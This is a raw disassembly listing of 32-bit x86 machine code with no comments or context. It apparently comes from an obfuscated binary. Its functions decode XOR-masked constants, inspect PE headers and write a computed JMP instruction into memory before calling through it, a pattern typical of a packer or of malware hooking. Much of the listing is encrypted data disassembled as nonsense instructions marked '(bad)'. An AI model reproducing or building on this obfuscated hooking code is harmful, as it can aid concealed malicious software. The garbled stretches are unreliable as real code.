  409fb8:	push   DWORD PTR [eax]
  409fba:	call   0x40b2c8
  409fbf:	and    DWORD PTR [ebp+0xc],0x0
  409fc3:	mov    eax,DWORD PTR [ebp-0x10]
  409fc6:	sub    eax,DWORD PTR [ebp+0xc]
  409fc9:	push   eax
  409fca:	mov    eax,DWORD PTR [ebp+0x10]
  409fcd:	add    eax,DWORD PTR [ebp+0xc]
  409fd0:	push   eax
  409fd1:	call   0x403861
  409fd6:	inc    DWORD PTR [ebp+0xc]
  409fd9:	cmp    DWORD PTR [ebp+0xc],0x52
  409fdd:	jb     0x409fc3
  409fe3:	mov    eax,DWORD PTR [ebp-0x8]
  409fe6:	mov    eax,ds:0x4121a8
  409feb:	mov    DWORD PTR [ebp+0x10],eax
  409fee:	mov    eax,ds:0x4122b4
  409ff3:	mov    DWORD PTR [ebp-0x68],eax
  409ff6:	mov    DWORD PTR [ebp+0xc],0xf89c8535
  409ffd:	mov    DWORD PTR [ebp-0x4],0xf89c8532
  40a004:	mov    eax,DWORD PTR [ebp+0xc]
  40a007:	xor    eax,esi
  40a009:	add    eax,ebx
  40a00b:	mov    DWORD PTR [ebp-0x7c],eax
  40a00e:	mov    DWORD PTR [ebp-0x70],0xf89cb535
  40a015:	mov    DWORD PTR [ebp-0x84],0xf89f0535
  40a01f:	mov    DWORD PTR [ebp-0x78],edi
  40a022:	mov    DWORD PTR [ebp-0x64],0xf89c85d5
  40a029:	mov    eax,DWORD PTR [ebp+0xc]
  40a02c:	xor    eax,esi
  40a02e:	add    eax,ebx
  40a030:	mov    DWORD PTR [ebp-0x38],eax
  40a033:	mov    DWORD PTR [ebp-0x48],0xf89c853e
  40a03a:	mov    BYTE PTR [ebp-0x29],0x57
  40a03e:	mov    eax,DWORD PTR [ebp+0xc]
  40a041:	xor    eax,esi
  40a043:	add    eax,ebx
  40a045:	mov    DWORD PTR [ebp-0x38],eax
  40a048:	mov    eax,DWORD PTR [ebp-0x64]
  40a04b:	xor    eax,esi
  40a04d:	add    eax,ebx
  40a04f:	push   eax
  40a050:	mov    eax,DWORD PTR [ebp-0x70]
  40a053:	xor    eax,esi
  40a055:	add    eax,ebx
  40a057:	push   eax
  40a058:	mov    eax,DWORD PTR [ebp-0x48]
  40a05b:	xor    eax,esi
  40a05d:	add    eax,ebx
  40a05f:	push   eax
  40a060:	lea    eax,[ebp-0x10c]
  40a066:	push   eax
  40a067:	push   DWORD PTR [ebp+0xc]
  40a06a:	push   DWORD PTR [ebp-0x4]
  40a06d:	call   0x40834f
  40a072:	test   eax,eax
  40a074:	je     0x40a0a5
  40a07a:	lea    eax,[ebp-0x10c]
  40a080:	push   eax
  40a081:	mov    eax,DWORD PTR [ebp-0x4]
  40a084:	xor    eax,esi
  40a086:	add    eax,ebx
  40a088:	push   eax
  40a089:	mov    eax,DWORD PTR [ebp+0x10]
  40a08c:	add    eax,0xaa
  40a091:	push   eax
  40a092:	mov    eax,DWORD PTR [ebp+0x10]
  40a095:	mov    eax,DWORD PTR [eax+0x198]
  40a09b:	push   DWORD PTR [eax]
  40a09d:	call   0x40b2c8
  40a0a2:	mov    DWORD PTR [ebp-0x24],eax
  40a0a5:	cmp    DWORD PTR [ebp-0x24],0x0
  40a0a9:	lea    edi,[ebp+0x4]
  40a0ac:	mov    DWORD PTR [ebp-0x7c],edi
  40a0af:	je     0x40a179
  40a0b5:	lea    eax,[ebp-0x38]
  40a0b8:	push   eax
  40a0b9:	mov    eax,DWORD PTR [ebp-0x78]
  40a0bc:	xor    eax,esi
  40a0be:	add    eax,ebx
  40a0c0:	push   eax
  40a0c1:	mov    eax,DWORD PTR [ebp-0x48]
  40a0c4:	xor    eax,esi
  40a0c6:	add    eax,ebx
  40a0c8:	push   eax
  40a0c9:	push   DWORD PTR [ebp-0x24]
  40a0cc:	lea    eax,[ebp-0x10c]
  40a0d2:	push   eax
  40a0d3:	push   DWORD PTR [ebp+0xc]
  40a0d6:	push   DWORD PTR [ebp-0x4]
  40a0d9:	call   0x408a84
  40a0de:	test   eax,eax
  40a0e0:	je     0x40a10e
  40a0e6:	lea    eax,[ebp-0x10c]
  40a0ec:	push   eax
  40a0ed:	mov    eax,DWORD PTR [ebp-0x4]
  40a0f0:	xor    eax,esi
  40a0f2:	add    eax,ebx
  40a0f4:	push   eax
  40a0f5:	mov    eax,DWORD PTR [ebp+0x10]
  40a0f8:	add    eax,0xee
  40a0fd:	push   eax
  40a0fe:	mov    eax,DWORD PTR [ebp+0x10]
  40a101:	mov    eax,DWORD PTR [eax+0x198]
  40a107:	push   DWORD PTR [eax]
  40a109:	call   0x40b2c8
  40a10e:	mov    ecx,DWORD PTR [ebp-0x48]
  40a111:	xor    ecx,esi
  40a113:	mov    eax,0xffcd8d63
  40a118:	sub    eax,ecx
  40a11a:	sub    eax,DWORD PTR [ebp-0x24]
  40a11d:	mov    ecx,DWORD PTR [ebp-0x68]
  40a120:	add    ecx,eax
  40a122:	mov    eax,DWORD PTR [ebp-0x24]
  40a125:	mov    DWORD PTR [eax+0x1],ecx
  40a128:	mov    al,BYTE PTR [ebp-0x29]
  40a12b:	mov    ecx,DWORD PTR [ebp-0x24]
  40a12e:	xor    al,0x48
  40a130:	sub    al,0x36
  40a132:	mov    BYTE PTR [ecx],al
  40a134:	lea    eax,[ebp-0x24]
  40a137:	inc    BYTE PTR [eax]
  40a139:	inc    eax
  40a13a:	push   eax
  40a13b:	pop    ecx
  40a13c:	dec    ecx
  40a13d:	xchg   ecx,edx
  40a13f:	dec    BYTE PTR [edx]
  40a141:	push   DWORD PTR [ebp+0x10]
  40a144:	mov    eax,ds:0x412264
  40a149:	mov    eax,DWORD PTR [eax]
  40a14b:	push   DWORD PTR [eax]
  40a14d:	lea    eax,ds:0x412280
  40a153:	push   DWORD PTR [eax]
  40a155:	lea    eax,ds:0x41202c
  40a15b:	push   DWORD PTR [eax]
  40a15d:	lea    eax,ds:0x412260
  40a163:	push   DWORD PTR [eax]
  40a165:	lea    eax,ds:0x41237c
  40a16b:	push   DWORD PTR [eax]
  40a16d:	xchg   ebx,edx
  40a16f:	inc    ebx
  40a170:	inc    ebx
  40a171:	sub    ebx,0x3
  40a174:	push   ebx
  40a175:	pop    eax
  40a176:	call   DWORD PTR [eax+0x1]
  40a179:	mov    DWORD PTR [ebp-0x6c],edi
  40a17c:	mov    eax,DWORD PTR [ebp-0x3c]
  40a17f:	mov    eax,DWORD PTR [ebp-0x18]
  40a182:	push   DWORD PTR [ebp-0x20]
  40a185:	lea    eax,[ebp-0x6c]
  40a188:	push   eax
  40a189:	call   0x406433
  40a18e:	mov    eax,ds:0x4121a8
  40a193:	push   0x4
  40a195:	add    eax,0x1cc
  40a19a:	push   eax
  40a19b:	lea    eax,[ebp-0x3c]
  40a19e:	push   eax
  40a19f:	call   0x4052e7
  40a1a4:	mov    eax,DWORD PTR [ebp-0x3c]
  40a1a7:	mov    eax,DWORD PTR [eax]
  40a1a9:	pop    edi
  40a1aa:	pop    esi
  40a1ab:	pop    ebx
  40a1ac:	leave  
  40a1ad:	ret    0xc
  40a1b0:	push   ebp
  40a1b1:	mov    ebp,esp
  40a1b3:	sub    esp,0x20
  40a1b6:	leave  
  40a1b7:	ret    0x4
  40a1ba:	push   ebp
  40a1bb:	mov    ebp,esp
  40a1bd:	push   ecx
  40a1be:	and    DWORD PTR ds:0x430556,edx
  40a1c4:	mov    DWORD PTR [ebp-0x4],0xf89c8535
  40a1cb:	mov    eax,DWORD PTR [ebp+0x8]
  40a1ce:	or     DWORD PTR ds:0x42ee30,0x430552
  40a1d8:	mov    al,BYTE PTR [eax]
  40a1da:	adc    DWORD PTR ds:0x42ee10,0x639e
  40a1e4:	add    al,0x36
  40a1e6:	sbb    DWORD PTR ds:0x4304a2,0x596d
  40a1f0:	xor    al,0x48
  40a1f2:	mov    DWORD PTR ds:0x43054e,0x7356
  40a1fc:	cmp    al,0xcb
  40a1fe:	mov    DWORD PTR ds:0x4304b2,0x64e0
  40a208:	jne    0x40a51c
  40a20e:	xor    DWORD PTR ds:0x4304b6,0x7c62
  40a218:	jmp    0x40a496
  40a21d:	lods   al,BYTE PTR ds:[esi]
  40a21e:	inc    edx
  40a21f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a220:	es jge 0x40a21c
  40a223:	lods   eax,DWORD PTR ds:[esi]
  40a224:	inc    esp
  40a225:	pop    ecx
  40a226:	push   cs
  40a227:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a228:	mov    ds:0x544d0bca,eax
  40a22d:	rcl    esi,cl
  40a22f:	jle    0x40a2af
  40a231:	fbstp  TBYTE PTR [eax+0x7e]
  40a234:	jle    0x40a1c9
  40a236:	out    dx,al
  40a237:	adc    al,0xf0
  40a239:	sbb    BYTE PTR [edi+0x60],bl
  40a23c:	mov    ebp,0x3586f0ae
  40a241:	aad    0x49
  40a243:	dec    edi
  40a244:	mov    ecx,0xb5370bfa
  40a249:	xor    al,0x3e
  40a24b:	aad    0x4e
  40a24d:	lock pushf 
  40a24f:	mul    DWORD PTR [esi+0x7b]
  40a252:	dec    edx
  40a253:	inc    esp
  40a254:	shl    DWORD PTR [ebx+edx*8],cl
  40a257:	sub    al,0xae
  40a259:	call   0x77623aa7
  40a25e:	jns    0x40a2ba
  40a260:	or     ebx,edx
  40a262:	dec    ebp
  40a263:	cmp    DWORD PTR [ebp+0x7b],0x38
  40a267:	jns    0x40a2b9
  40a269:	pop    eax
  40a26a:	xlat   BYTE PTR ds:[ebx]
  40a26b:	mov    ah,BYTE PTR [ebx-0x69]
  40a26e:	and    BYTE PTR [edx-0x56],al
  40a271:	push   esi
  40a272:	sub    al,0x67
  40a274:	frstor [ecx+0x7a6dc7d6]
  40a27a:	mov    ah,0x7f
  40a27c:	mov    esi,esp
  40a27e:	int    0x3d
  40a280:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a281:	sbb    bh,0x49
  40a284:	pop    ebx
  40a285:	sbb    DWORD PTR [esi+edx*1-0x5ed6d9e6],esp
  40a28c:	call   0x8afd:0xdebbb01a
  40a293:	vmulsd xmm4,xmm6,xmm5
  40a297:	lds    esi,FWORD PTR [ebp-0x25]
  40a29a:	mov    ss,WORD PTR [ecx-0x968f034]
  40a2a0:	cs mov cl,0x77
  40a2a3:	dec    edi
  40a2a4:	aam    0x35
  40a2a6:	test   DWORD PTR [esi+0x50],esp
  40a2a9:	or     ch,BYTE PTR [ebx+ebp*1-0x3826060e]
  40a2b0:	call   0xd4a:0xc631d1a7
  40a2b7:	xchg   edi,eax
  40a2b8:	adc    eax,0xb9d0c33c
  40a2bd:	fdivr  DWORD PTR [eax+0x6d]
  40a2c0:	rcr    BYTE PTR [edi-0x7],1
  40a2c3:	std    
  40a2c4:	xor    eax,0xf1c2e66d
  40a2c9:	pop    esi
  40a2ca:	fs je  0x40a34b
  40a2cd:	adc    al,0x5
  40a2cf:	dec    ecx
  40a2d0:	sub    dl,BYTE PTR [eax]
  40a2d2:	scas   eax,DWORD PTR es:[edi]
  40a2d3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a2d4:	dec    esp
  40a2d5:	fisub  WORD PTR [ebx+0x67]
  40a2d8:	mov    ecx,0x92fc0a5f
  40a2dd:	xchg   ebp,eax
  40a2de:	movd   mm5,DWORD PTR [edx+edi*8-0x22]
  40a2e3:	sahf   
  40a2e4:	mov    ds:0x8b6de4cb,eax
  40a2e9:	imul   DWORD PTR [esi-0x651f7eab]
  40a2ef:	scas   eax,DWORD PTR es:[edi]
  40a2f0:	push   0x952714c4
  40a2f5:	mov    DWORD PTR [edi],0xa088e7d9
  40a2fb:	mov    eax,0x9eb52052
  40a300:	mov    ebx,0x2977bad2
  40a305:	mov    WORD PTR [edx+0x8878c1d],cs
  40a30b:	hlt    
  40a30c:	xor    ebx,DWORD PTR [edi-0x4d]
  40a30f:	adc    eax,0xdb0e75da
  40a314:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a315:	inc    esi
  40a316:	push   edi
  40a317:	(bad)  
  40a318:	in     al,dx
  40a319:	out    0xd0,al
  40a31b:	xor    BYTE PTR [ebx+0x3d],cl
  40a31e:	jmp    0xb537bb93
  40a323:	pop    eax
  40a324:	xchg   ebp,eax
  40a325:	and    esp,DWORD PTR [edx+0x7d]
  40a328:	and    al,bl
  40a32a:	add    bl,BYTE PTR [eax]
  40a32c:	mov    ?,WORD PTR [ecx+ecx*8-0x45d393f6]
  40a333:	into   
  40a334:	jmp    FWORD PTR [esi-0x23bed797]
  40a33a:	add    eax,0x7ddbd484
  40a33f:	ins    BYTE PTR es:[edi],dx
  40a340:	cld    
  40a341:	xor    BYTE PTR [edx+0x7a],0xae
  40a345:	mov    eax,ds:0x53e0e160
  40a34a:	xchg   ebp,eax
  40a34b:	xchg   ecx,eax
  40a34c:	xchg   ebp,eax
  40a34d:	xchg   esi,eax
  40a34e:	cmp    BYTE PTR [edx+0x2abac762],ch
  40a354:	mov    al,ds:0xeff958b
  40a359:	jae    0x40a2f9
  40a35b:	lock inc ebx
  40a35d:	addr16 xchg ebx,eax
  40a35f:	repnz lods al,BYTE PTR ds:[esi]
  40a361:	idiv   DWORD PTR [edx+0x11925449]
  40a367:	and    al,0xf0
  40a369:	dec    ecx
  40a36a:	fs stc 
  40a36c:	aad    0xc8
  40a36e:	jg     0x40a37a
  40a370:	bound  edi,QWORD PTR [edi+0x47]
  40a373:	cdq    
  40a374:	scas   al,BYTE PTR es:[edi]
  40a375:	rol    DWORD PTR [edx-0x31986c70],0x98
  40a37c:	push   0xe7e992a5
  40a381:	lahf   
  40a382:	gs mov dh,0x39
  40a385:	imul   DWORD PTR [esi]
  40a387:	popf   
  40a388:	dec    ebp
  40a389:	cmp    BYTE PTR [esi+0x8],bh
  40a38c:	lods   eax,DWORD PTR ds:[esi]
  40a38d:	loope  0x40a3d8
  40a38f:	(bad)  
  40a390:	lods   al,BYTE PTR ds:[esi]
  40a391:	sub    ch,BYTE PTR [ebp+0x292a153a]
  40a397:	js     0x40a32d
  40a399:	loop   0x40a378
  40a39b:	pop    ebp
  40a39c:	mov    dh,0x7a
  40a39e:	sbb    dh,BYTE PTR [esi+0x413a8ac]
  40a3a4:	xrelease mov DWORD PTR [ebx+eax*1],edi
  40a3a8:	(bad)  [edx-0x34]
  40a3ab:	lods   al,BYTE PTR ds:[esi]
  40a3ac:	clc    
  40a3ad:	add    DWORD PTR [ecx],ebp
  40a3af:	aaa    
  40a3b0:	mov    ecx,0xf1cab883
  40a3b5:	jg     0x40a3bd
  40a3b7:	or     DWORD PTR [ebx+0x7e],esi
  40a3ba:	xchg   BYTE PTR [eax],al
  40a3bc:	xor    BYTE PTR [ecx+0x6707bf3c],dl
  40a3c2:	lods   al,BYTE PTR ds:[esi]
  40a3c3:	mov    WORD PTR [ecx+0x64],?
  40a3c6:	inc    ebp
  40a3c7:	push   ss
  40a3c8:	outs   dx,DWORD PTR ds:[esi]
  40a3c9:	push   0x60
  40a3cb:	rcl    BYTE PTR [edx+edx*1],cl
  40a3ce:	sti    
  40a3cf:	arpl   WORD PTR [ebx],ax
  40a3d1:	push   ecx
  40a3d2:	sar    DWORD PTR [ebp+ebx*4+0x296977da],1
  40a3d9:	enter  0x157a,0x6d
  40a3dd:	or     al,0x2b
  40a3df:	(bad)  
  40a3e1:	popf   
  40a3e2:	(bad)  
  40a3e3:	(bad)  
  40a3e4:	fadd   DWORD PTR [esi-0x7f7f7483]
  40a3ea:	fwait
  40a3eb:	hlt    
  40a3ec:	shl    DWORD PTR [ebp+0x59],cl
  40a3ef:	(bad)  
  40a3f0:	repnz or ch,BYTE PTR [ebx]
  40a3f3:	fwait
  40a3f4:	dec    DWORD PTR [ebp+0x4ef4ba77]
  40a3fa:	add    cl,al
  40a3fc:	mov    dh,cl
  40a3fe:	fsub   DWORD PTR [ecx]
  40a400:	add    ecx,ecx
  40a402:	cdq    
  40a403:	push   ecx
  40a404:	mov    eax,0xa4af83d2
  40a409:	sahf   
  40a40a:	adc    ch,BYTE PTR [ecx-0x6da6cdc3]
  40a410:	in     eax,0x65
  40a412:	jnp    0x40a436
  40a414:	lods   al,BYTE PTR ds:[esi]
  40a415:	(bad)  
  40a416:	fild   DWORD PTR [ebp+0x57]
  40a419:	scas   al,BYTE PTR es:[edi]
  40a41a:	gs (bad) 
  40a41c:	mov    eax,ds:0xde83526b
  40a421:	imul   BYTE PTR [eax+0x1b63ea72]
  40a427:	ret    0x438e
  40a42a:	adc    DWORD PTR [esi],esi
  40a42c:	jmp    0xf062:0xc9c9
  40a432:	fisub  WORD PTR [eax-0x1]
  40a435:	data16 adc dl,BYTE PTR [ecx]
  40a438:	mov    ds:0x179ab541,al
  40a43d:	arpl   sp,sp
  40a43f:	pop    es
  40a440:	ret    0x6489
  40a443:	out    0x41,eax
  40a445:	aam    0x8f
  40a447:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a448:	inc    eax
  40a449:	mov    ch,0xc9
  40a44b:	data16 jbe 0x40a49d
  40a44e:	cdq    
  40a44f:	mov    cl,0xa3
  40a451:	pop    edi
  40a452:	outs   dx,BYTE PTR ds:[esi]
  40a453:	cmp    cl,ah
  40a455:	sub    al,BYTE PTR [edi]
  40a457:	js     0x40a444
  40a459:	gs gs dec ebx
  40a45c:	cmp    al,0x48
  40a45e:	ins    DWORD PTR es:[edi],dx
  40a45f:	ja     0x40a4df
  40a461:	je     0x40a491
  40a463:	ins    BYTE PTR es:[edi],dx
  40a464:	pop    esi
  40a465:	popf   
  40a466:	lds    esi,FWORD PTR [ebx-0x4f]
  40a469:	xchg   edx,eax
  40a46a:	adc    al,0x6a
  40a46c:	inc    edx
  40a46d:	lock ins BYTE PTR es:[edi],dx
  40a46f:	adc    BYTE PTR [edi+edi*8+0x36],dl
  40a473:	data16 sub al,0x5f
  40a476:	fist   WORD PTR [ecx+0x5a]
  40a479:	js     0x40a4d5
  40a47b:	jnp    0x40a443
  40a47d:	retf   0x5f09
  40a480:	pop    edi
  40a481:	mov    ?,WORD PTR [edx+0x43642de3]
  40a487:	jo     0x40a47f
  40a489:	out    0x8f,al
  40a48b:	std    
  40a48c:	xor    ecx,DWORD PTR [edx+0x4062fa7f]
  40a492:	pop    ebp
  40a493:	xor    BYTE PTR [ecx],0x71
  40a496:	mov    eax,DWORD PTR [ebp+0x8]
  40a499:	mov    DWORD PTR ds:0x430542,0x17
  40a4a3:	cmp    DWORD PTR ds:0x430542,0x0
  40a4aa:	je     0x40a4d8
  40a4b0:	cmp    DWORD PTR ds:0x430542,0x24
  40a4b7:	jne    0x40a4c6
  40a4bd:	push   DWORD PTR [ebp-0x28]
  40a4c0:	call   DWORD PTR ds:0x42eae4
  40a4c6:	mov    ecx,DWORD PTR ds:0x430542
  40a4cc:	dec    ecx
  40a4cd:	mov    DWORD PTR ds:0x430542,ecx
  40a4d3:	jmp    0x40a4a3
  40a4d8:	mov    ecx,DWORD PTR [ebp+0x8]
  40a4db:	sub    edx,0x356a
  40a4e1:	add    ecx,DWORD PTR [eax+0x3c]
  40a4e4:	and    eax,edx
  40a4e6:	mov    edx,0x7510856
  40a4eb:	mov    DWORD PTR [ebp+0x8],ecx
  40a4ee:	mov    eax,DWORD PTR [ebp-0x4]
  40a4f1:	xor    eax,edx
  40a4f3:	push   esi
  40a4f4:	mov    esi,DWORD PTR [ebp+0x8]
  40a4f7:	mov    ecx,0x32729d
  40a4fc:	add    eax,ecx
  40a4fe:	cmp    DWORD PTR [esi+0x54],eax
  40a501:	pop    esi
  40a502:	je     0x40a510
  40a508:	mov    eax,DWORD PTR [ebp+0x8]
  40a50b:	jmp    0x40a7a7
  40a510:	mov    eax,DWORD PTR [ebp-0x4]
  40a513:	xor    eax,edx
  40a515:	add    eax,ecx
  40a517:	jmp    0x40a7a7
  40a51c:	mov    eax,DWORD PTR [ebp-0x4]
  40a51f:	xor    eax,0x7510856
  40a524:	jmp    0x40a7a2
  40a529:	mov    esi,edi
  40a52b:	pop    ds
  40a52c:	outs   dx,BYTE PTR ds:[esi]
  40a52d:	adc    esp,DWORD PTR [esi+0x5b]
  40a530:	jnp    0x40a586
  40a532:	xor    eax,0x112fa360
  40a537:	imul   esp
  40a539:	mov    ah,0xe8
  40a53b:	jle    0x40a5bb
  40a53d:	fbstp  TBYTE PTR [eax+0x7e]
  40a540:	jle    0x40a582
  40a542:	(bad)  
  40a544:	xchg   ecx,eax
  40a545:	fimul  DWORD PTR [eax-0x33]
  40a548:	out    dx,eax
  40a549:	(bad)  
  40a54a:	stc    
  40a54b:	(bad)  
  40a54c:	pusha  
  40a54d:	sub    ecx,DWORD PTR [esi+esi*8+0x55340b07]
  40a554:	xchg   DWORD PTR [edx-0x75],esi
  40a557:	jo     0x40a502
  40a559:	icebp  
  40a55a:	sub    ebx,DWORD PTR [eax-0x643ef421]
  40a560:	lods   al,BYTE PTR ds:[esi]
  40a561:	cdq    
  40a562:	add    dh,BYTE PTR [esp+edi*2]
  40a565:	gs push esi
  40a567:	mov    ah,dh
  40a569:	sbb    DWORD PTR [ecx+0x6c],esp
  40a56c:	jae    0x40a5c7
  40a56e:	adc    dh,BYTE PTR [eax-0x3a]
  40a571:	daa    
  40a572:	sar    DWORD PTR [eax+0x2e],cl
  40a575:	loop   0x40a5e5
  40a577:	ins    DWORD PTR es:[edi],dx
  40a578:	sub    ebp,eax
  40a57a:	mov    esi,0x52317e5c
  40a57f:	test   eax,esi
  40a581:	aam    0x6a
  40a583:	(bad)  
  40a584:	in     eax,dx
  40a585:	push   ebx
  40a586:	mov    ebp,0x55107c0c
  40a58b:	ja     0x40a51a
  40a58d:	(bad)  
  40a58e:	jae    0x40a520
  40a590:	inc    ebx
  40a591:	push   ebp
  40a592:	test   eax,0xf1e18410
  40a597:	and    al,0x2a
  40a599:	(bad)  
  40a59a:	inc    edx
  40a59b:	mov    ch,0xba
  40a59d:	mov    al,ds:0xba25da6e
  40a5a2:	xchg   ecx,eax
  40a5a3:	ret    
  40a5a4:	pusha  
  40a5a5:	retf   
  40a5a6:	scas   al,BYTE PTR es:[edi]
  40a5a7:	xchg   ch,cl
  40a5a9:	imul   esp,DWORD PTR [eax+eiz*1],0xffffff8d
  40a5ad:	nop
  40a5ae:	mov    ah,0x1c
  40a5b0:	(bad)  
  40a5b1:	fadd   QWORD PTR [esi-0x62c5c52e]
  40a5b7:	sub    BYTE PTR [edi+0x52],0xf4
  40a5bb:	mov    dh,0xcb
  40a5bd:	aam    0x5d
  40a5bf:	loopne 0x40a63c
  40a5c1:	mov    eax,ds:0xc4101688
  40a5c6:	push   ss
  40a5c7:	push   esp
  40a5c8:	sahf   
  40a5c9:	nop
  40a5ca:	inc    esi
  40a5cb:	xchg   edi,eax
  40a5cc:	push   esp
  40a5cd:	mov    al,0xc6
  40a5cf:	data16 imul BYTE PTR [ecx*8-0x75e512ac]
  40a5d7:	jge    0x40a5f3
  40a5d9:	sti    
  40a5da:	sub    eax,0x8aad4e70
  40a5df:	sbb    DWORD PTR [edi-0x4226b63a],edx
  40a5e5:	mov    edi,0xb90b823a
  40a5ea:	mov    eax,0x549937dd
  40a5ef:	push   ecx
  40a5f0:	outs   dx,DWORD PTR gs:[esi]
  40a5f2:	sbb    eax,0x68837daf
  40a5f7:	into   
  40a5f8:	xlat   BYTE PTR ds:[ebx]
  40a5f9:	cmp    al,0x78
  40a5fb:	retf   
  40a5fc:	xor    dl,ah
  40a5fe:	push   es
  40a5ff:	jae    0x40a5cc
  40a601:	pand   mm7,QWORD PTR [edx-0x5d7e90c4]
  40a608:	xor    ebp,DWORD PTR ds:0xcd031e51
  40a60e:	idiv   BYTE PTR [esi]
  40a610:	mov    esi,DWORD PTR [esi+edi*1-0x3f2c1cc5]
  40a617:	das    
  40a618:	pusha  
  40a619:	ins    BYTE PTR es:[edi],dx
  40a61a:	pop    edx
  40a61b:	and    al,0xa2
  40a61d:	sar    BYTE PTR cs:[edx],cl
  40a620:	imul   eax
  40a622:	push   0xdd82e7d9
  40a627:	pop    ebp
  40a628:	mov    al,0x40
  40a62a:	cmp    ebx,DWORD PTR [edx-0x31914a8a]
  40a630:	adc    ch,BYTE PTR [eax-0x68d1d53a]
  40a636:	pop    ecx
  40a637:	xchg   ecx,eax
  40a638:	cmp    BYTE PTR [ecx-0x70],bl
  40a63b:	inc    ebp
  40a63c:	or     BYTE PTR [eax+eax*1-0x71],dl
  40a640:	out    dx,ax
  40a642:	fistp  WORD PTR [edi]
  40a644:	out    0x75,al
  40a646:	inc    ebx
  40a647:	outs   dx,BYTE PTR ds:[esi]
  40a648:	mov    edi,0xb3aefd0a
  40a64d:	outs   dx,DWORD PTR ds:[esi]
  40a64e:	cli    
  40a64f:	daa    
  40a650:	rcr    dl,1
  40a652:	addr16 (bad) 
  40a655:	inc    esi
  40a656:	dec    esi
  40a657:	icebp  
  40a658:	sub    esi,DWORD PTR [ebp+0x3b097ea8]
  40a65e:	mov    dl,0x9
  40a660:	imul   edx,DWORD PTR [edx-0x7a2ce391],0x48
  40a667:	test   DWORD PTR [eax-0x33],0x1eb4d8c6
  40a66e:	sub    BYTE PTR [esi+0x76ba98e1],al
  40a674:	mov    bl,0x2b
  40a676:	loop   0x40a6d1
  40a678:	out    0xf4,eax
  40a67a:	and    al,0x5c
  40a67c:	mov    ebp,0xcaa29d35
  40a681:	je     0x40a64f
  40a683:	pushf  
  40a684:	xor    al,0x5f
  40a686:	or     cl,cl
  40a688:	push   cs
  40a689:	mov    eax,0xe5745618
  40a68e:	aam    0x5d
  40a690:	jp     0x40a681
  40a692:	jbe    0x40a6b7
  40a694:	pop    esi
  40a695:	jl     0x40a6c2
  40a697:	lods   al,BYTE PTR ds:[esi]
  40a698:	pop    edi
  40a699:	out    dx,al
  40a69a:	cmp    al,0xc2
  40a69c:	popa   
  40a69d:	fisubr DWORD PTR [esi+0x37b02f59]
  40a6a3:	sub    DWORD PTR [eax+eax*1+0x70],esp
  40a6a7:	cmp    BYTE PTR [eax-0x59],al
  40a6aa:	add    BYTE PTR [ebx+0x3b49ff92],bh
  40a6b0:	xor    DWORD PTR [edx+0x73],eax
  40a6b3:	addr16 push esi
  40a6b5:	scas   eax,DWORD PTR es:[edi]
  40a6b6:	arpl   WORD PTR [edx+ebp*2-0x48],si
  40a6ba:	loope  0x40a68a
  40a6bc:	dec    edi
  40a6bd:	rcpps  xmm6,XMMWORD PTR [esi-0x46a85ba2]
  40a6c4:	mov    dh,0x3e
  40a6c6:	xor    eax,0x79
  40a6c9:	mov    ecx,0xbdbcdd75
  40a6ce:	lods   al,BYTE PTR ds:[esi]
  40a6cf:	inc    ebp
  40a6d0:	pop    edi
  40a6d1:	push   ecx
  40a6d2:	mov    ecx,0xaf0accd4
  40a6d7:	lahf   
  40a6d8:	aas    
  40a6d9:	lea    edx,[ebx]
  40a6db:	add    DWORD PTR [esi+edx*4+0x61d2a03e],edx
  40a6e2:	jecxz  0x40a732
  40a6e4:	add    al,0xaa
  40a6e6:	int3   
  40a6e7:	mov    edi,0x9ddda409
  40a6ec:	pop    ebx
  40a6ed:	ret    
  40a6ee:	lods   eax,DWORD PTR ds:[esi]
  40a6ef:	imul   ebp,DWORD PTR [ecx],0x4f
  40a6f2:	jnp    0x40a73b
  40a6f4:	mov    esp,0xbc8e7f72
  40a6f9:	pop    edx
  40a6fa:	xor    eax,DWORD PTR [esi+0x6]
  40a6fd:	pop    es
  40a6fe:	push   esp
  40a6ff:	mov    dh,0xa5
  40a701:	sub    eax,0xa4340d61
  40a706:	out    dx,al
  40a707:	push   ebp
  40a708:	out    0xa7,eax
  40a70a:	rol    BYTE PTR [ecx+0x5975008e],cl
  40a710:	xor    esp,ecx
  40a712:	add    ebp,0x66c7f1ad
  40a718:	xchg   esp,eax
  40a719:	xchg   ebp,eax
  40a71a:	cld    
  40a71b:	(bad)  [edx+0x20eae1e2]
  40a721:	dec    edi
  40a722:	in     al,0x57
  40a724:	aam    0xf2
  40a726:	aaa    
  40a727:	xchg   esp,eax
  40a728:	jbe    0x40a6c5
  40a72a:	sbb    edx,DWORD PTR [edi]
  40a72c:	aam    0x67
  40a72e:	ins    BYTE PTR es:[edi],dx
  40a72f:	jmp    0xf7f7:0x771aa913
  40a736:	cli    
  40a737:	mov    esp,0x8f10427e
  40a73c:	mov    ecx,0xc534c015
  40a741:	jo     0x40a749
  40a743:	mov    dh,0xb2
  40a745:	add    esp,DWORD PTR [edx+0x477f8011]
  40a74b:	mov    ecx,0xfcb8c791
  40a750:	push   edi
  40a751:	out    0xf1,al
  40a753:	cmc    
  40a754:	lea    esp,[ebp-0x72]
  40a757:	popa   
  40a758:	outs   dx,DWORD PTR ds:[esi]
  40a759:	gs iret 
  40a75b:	xor    bl,BYTE PTR [edx]
  40a75d:	sbb    esi,DWORD PTR [eax+0x54]
  40a760:	div    BYTE PTR [ebx]
  40a762:	push   cs
  40a763:	mov    ch,0x84
  40a765:	call   FWORD PTR [edi]
  40a767:	sar    DWORD PTR [ebx],0xd9
  40a76a:	add    ebp,edx
  40a76c:	(bad)  [esi+0x5f0d9185]
  40a772:	fstp   DWORD PTR [edx-0x20d4d23f]
  40a778:	je     0x40a7f8
  40a77a:	push   ebx
  40a77b:	push   es
  40a77c:	fs clc 
  40a77e:	sub    ebx,esp
  40a780:	dec    edx
  40a781:	(bad)  
  40a782:	mov    ds:0x8eb0d8e2,eax
  40a787:	add    ah,0xd1
  40a78a:	retf   0x8509
  40a78d:	pop    ebp
  40a78e:	mov    edi,0xbb7c29fb
  40a793:	ja     0x40a746
  40a795:	(bad)  
  40a796:	push   edx
  40a797:	outs   dx,BYTE PTR ds:[esi]
  40a798:	inc    edx
  40a799:	push   0x84dd9087
